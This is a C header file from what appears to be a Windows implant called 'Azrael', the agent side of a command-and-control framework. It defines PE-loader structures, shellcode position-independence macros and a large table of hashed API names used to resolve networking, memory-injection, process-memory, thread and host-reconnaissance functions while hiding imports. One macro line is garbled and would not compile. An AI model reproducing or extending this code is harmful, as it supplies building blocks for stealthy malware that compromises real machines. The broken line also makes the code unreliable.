#ifndef AZRAEL_IMPLANT_WIN_API_H
#define AZRAEL_IMPLANT_WIN_API_H

#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <WS2tcpip.h>
#include <winhttp.h>

#include "msvc_api_definition.h"

#define DEBUG_LEVEL 2
#if DEBUG_LEVEL == 1
#define DEBUG(x, ...) printf(x, ##__VA_ARGS__)
    #define DEBUG_MEDIUM(x, ...)
    #define DEBUG_LOW(x, ...)
    #define DEBUG_NATIVE(x, ...)
#elif DEBUG_LEVEL == 2
#define DEBUG(x, ...) printf(x, ##__VA_ARGS__)
#define DEBUG_MEDIUM(x, ...) printf(x, ##__VA_ARGS__)
#define DEBUG_LOW(x, ...)
#define DEBUG_NATIVE(x, ...)
#elif DEBUG_LEVEL == 3
#define DEBUG(x, ...) printf(x, ##__VA_ARGS__)
    #define DEBUG_MEDIUM(x, ...) printf(x, ##__VA_ARGS__)
    #define DEBUG_LOW(x, ...) printf(x, ##__VA_ARGS__)
    #define DEBUG_NATIVE(x, ...)
#elif DEBUG_LEVEL == 4
    #define DEBUG(x, ...) printf(x, ##__VA_ARGS__)
    #define DEBUG_MEDIUM(x, ...) printf(x, ##__VA_ARGS__)
    #define DEBUG_LOW(x, ...) printf(x, ##__VA_ARGS__)
    #define DEBUG_NATIVE(x, ...) printf(x, ##__VA_ARGS__)
#else
    #define DEBUG(x, ...)
    #define DEBUG_MEDIUM(x, ...)
    #define DEBUG_LOW(x, ...)
    #define DEBUG_NATIVE(x, ...)
#endif

typedef unsigned __int64    QWORD;

#define SECTION_SIZE 0x28

typedef struct _PERelocation {
    DWORD RVA;
    WORD Type : 4;
} PERelocation;

typedef struct _IMAGE_RELOCATION_ENTRY {
    WORD Offset : 12;
    WORD Type : 4;
} IMAGE_RELOCATION_ENTRY, *PIMAGE_RELOCATION_ENTRY;

typedef struct _PE {
    BOOL memoryMapped;
    IMAGE_DOS_HEADER* dosHeader;
    IMAGE_NT_HEADERS* ntHeader;
    IMAGE_OPTIONAL_HEADER* optionalHeader;
    IMAGE_DATA_DIRECTORY* dataDirectory;
    IMAGE_EXPORT_DIRECTORY* exportDirectory;
    IMAGE_SECTION_HEADER* sectionHeader;
    LPDWORD AddressOfFunctions;
    LPDWORD AddressOfNames;
    LPWORD AddressOfNameOrdinals;
    DWORD NumberOfNames;
    PERelocation* relocations;
    DWORD numberOfRelocations;
    PVOID baseAddress;
} PE;

typedef struct __ILT_ENTRY_64 {
    union {
        DWORD ORDINAL : 16;
        DWORD HINT_NAME_TABE : 32;
    } FIELD_2;
    DWORD ORDINAL_NAME_FLAG : 1;
} ILT_ENTRY_64, * PILT_ENTRY_64;

typedef BOOL(WINAPI* LPDLLMAIN)(DWORD_PTR image_base, DWORD reason, LPVOID reserved);


#define WIN32_FUNC( x ) MSVC$##x x
#define NT_FUNC( x ) MSVC$##x x
#define WIN32_DECL( x ) MSVC$##x win32_##x
#define NT_DECL( x ) MSVC$##x win32_##x

#if SHELLCODE
#define  __attribute__( ( section( "." #s "$" #x "" ) ) )
    #define GET_SYMBOL( x )     ( ULONG_PTR )( GetRIP() - ( ( ULONG_PTR ) & GetRIP - ( ULONG_PTR ) x ) )
    unsigned long long GetRIP( void );
#else
#define SEC( s, x )
#define GET_SYMBOL( x )     x
#endif




#define SEC_MRDATA 0x48d2aa70
#define SEC_DATA 0x7d57d6f1

#define DLL_NTDLL 0xab2e3931
#define DLL_KERNEL32 0x48076719
#define DLL_MSVCRT 0x90e59712
#define DLL_WS2_32 0xa0b4cb33
#define DLL_WSOCK32 0x4c3ac0bf
#define DLL_KERNELBASE 0x1853064f
#define DLL_ADVAPI32 0x3ee702ed
#define DLL_WINHTTP 0x50830b81

#define FCT_PRINTF 0x78a3bdbc
#define FCT_REALLOC 0x82ae12b
#define FCT_CALLOC 0x591ea8f7
#define FCT_MEMSET 0x70bb4a34
#define FCT_MEMCPY 0x70bb0794
#define FCT_FREE 0x516d25cb
#define FCT_STRDUP 0x12e32a6a
#define FCT_STRNCMP 0x79571230
#define FCT_STRICMP 0x6f4ae8ea
#define FCT_MBSTOWCS 0xb3de8ebb
#define FCT_WCSICMP 0x7b9e41be
#define FCT_WCSCMP 0x87edb6b6
#define FCT_SCANF 0x7ff4d474
#define FCT_SWPRINTF 0x86c96e86
#define FCT_GETLASTERROR 0x5b8c8f87
#define FCT_WINHTTPOPEN 0x50955629
#define FCT_WINHTTPCONNECT 0x96481ae1
#define FCT_WINHTTPOPENREQUEST 0x7a08a4d2
#define FCT_WINHTTPSENDREQUEST 0x40d4e5aa
#define FCT_WINHTTPRECEIVERESPONSE 0x4514f1a9
#define FCT_WINHTTPQUERYDATAAVAILABLE 0xb0b3ac48
#define FCT_WINHTTPREADDATA 0x1657f6cd
#define FCT_WINHTTPADDREQUESTHEADERS 0x70f148a5
#define FCT_WINHTTPCLOSEHANDLE 0x70d073d9
#define FCT_WSACLEANUP 0x48e4ff7c
#define FCT_IOCTLSOCKET 0xc54021ed
#define FCT_RECV 0x517382d9
#define FCT_SEND 0x51741093
#define FCT_WSASTARTUP 0x2af31a87
#define FCT_GETADDRINFO 0x3ae819b0
#define FCT_SOCKET 0x7f699532
#define FCT_WSAGETLASTERROR 0x3d6f3c72
#define FCT_CONNECT 0x9dc12033
#define FCT_CLOSESOCKET 0x7affce8
#define FCT_ACCEPT 0x54937bb9
#define FCT_BIND 0x516acf26
#define FCT_SHUTDOWN 0xfeb2225
#define FCT_FREEADDRINFO 0xdd32f212
#define FCT_LISTEN 0x6eb1d218
#define FCT_LOADLIBRARYEXA 0xa9fa01fc
#define FCT_VIRTUALALLOC 0xe3a7941b
#define FCT_VIRTUALPROTECT 0xfcbea2d1
#define FCT_VIRTUALFREE 0xd09b4f52
#define FCT_STRTOK 0x7fcc70f0
#define FCT_GETPROCADDRESS 0xf3371483
#define FCT_STRNCPY 0x7fcc28ce
#define FCT_STRCHR 0x7fcc27bf
#define FCT_READPROCESSMEMORY 0x98a912dd
#define FCT_VIRTUALQUERY 0xe4cdee46
#define FCT_WRITEPROCESSMEMORY 0x812e1fac
#define FCT_VSNPRINTF 0xbc54b392
#define FCT_VPRINTF 0x56ee97b2
#define FCT_HEAPCREATE 0x821c313b
#define FCT_HEAPALLOC 0x3a178e72
#define FCT_HEAPFREE 0xd339dac9
#define FCT_HEAPDESTROY 0xf5514091
#define FCT_HEAPREALLOC 0x29b65d69
#define FCT_RTLINITUNICODESTRING 0x8c060b4d
#define FCT_NTQUERYSYSTEMTIME 0x89ea7d15
#define FCT_RTLHASHUNICODESTRING 0xf440d2dd
#define FCT_RTLRBINSERTNODEEX 0xa0a42267
#define FCT_RTLCOMPAREUNICODESTRINGS 0x85b98813
#define FCT_RESOLVEDELAYLOADEDAPI 0xae55167b
#define FCT_LOADLIBRARYA 0x9133019f
#define FCT_LOADLIBRARYW 0x913301b5
#define FCT_LOADLIBRARYEXW 0xa9fa0212
#define FCT_FREELIBRARY 0x3a305a60
#define FCT_SEARCHPATHW 0x42954423
#define FCT_CREATEFILEW 0x57d3ca54
#define FCT_GETFILESIZE 0x6ad7e164
#define FCT_MEMMOVE 0x8821717f
#define FCT_FLUSHINSTRUCTIONCACHE 0x22d5cde1
#define FCT_RTLADDFUNCTIONTABLE 0x7ea63512
#define FCT_CLOSEHANDLE 0xed0fd22b
#define FCT_READFILE 0xcf2e025
#define FCT_RTLALLOCATEHEAP 0xdd3af79e
#define FCT_GETPROCESSHEAP 0x4b275a66
#define FCT_NTCONTINUE 0x12fefcf0
#define FCT_RTLCAPTURECONTEXT 0x28126554
#define FCT_GETSYSTEMTIMEASFILETIME 0xecef6560
#define FCT_CREATETHREAD 0x72e67cd5
#define FCT_FOPEN 0x7f106921
#define FCT_FREAD 0x7f11deeb
#define FCT_FSEEK 0x7f126bd7
#define FCT_FEOF 0x516cefc9
#define FCT_FCLOSE 0x60426125
#define FCT_FWRITE 0x61af7c1a
#define FCT_FERROR 0x6069e8b9
#define FCT_EXITTHREAD 0xd82a681b
#define FCT_NTSETINFORMATIONPROCESS 0xe9ca859c
#define FCT_STRCAT 0xe664ca47
#define FCT_RTLCOPYMEMORY 0xf1d8c58f
#define FCT_STRCMP 0xe664fccf
#define FCT_STRLEN 0xe669c9ee
#define FCT_MULTIBYTETOWIDECHAR 0xa0c6a212
#define FCT_RTLFILLMEMORY 0xa951699b
#define FCT_WCSLEN 0xe669ca04
#define FCT_WCSCAT 0xe664ca5d
#define FCT_WCSCPY 0xe6650ad1
#define FCT_STRCPY 0xe6650abb
#define FCT_CREATEFILEA 0x57d3ca3e
#define FCT_SETFILEPOINTER 0x77f4c556
#define FCT_WRITEFILE 0x7e259014
#define FCT_RTLMOVEMEMORY 0xa040af0b
#define FCT_SLEEP 0x7ff9d3c2
#define FCT_GETUSERNAMEA 0xd6cd500a
#define FCT_GETHOSTNAME 0x2299a208
#define FCT_GETHOSTBYNAME 0x153f2e23
#define FCT_INET_NTOA 0x3c422aca
#define FCT_GETCOMPUTERNAMEEXA 0xb60d7117
#define FCT_K32GETPROCESSIMAGEFILENAMEA 0xd124671d
#define FCT_GETCURRENTPROCESSID 0x6158c18
#define FCT_OPENPROCESSTOKEN 0xa57c7abb
#define FCT_GETTOKENINFORMATION 0xd332a70
#define FCT_WSAPOLL 0xa9b887ab

#endif //AZRAEL_IMPLANT_WIN_API_H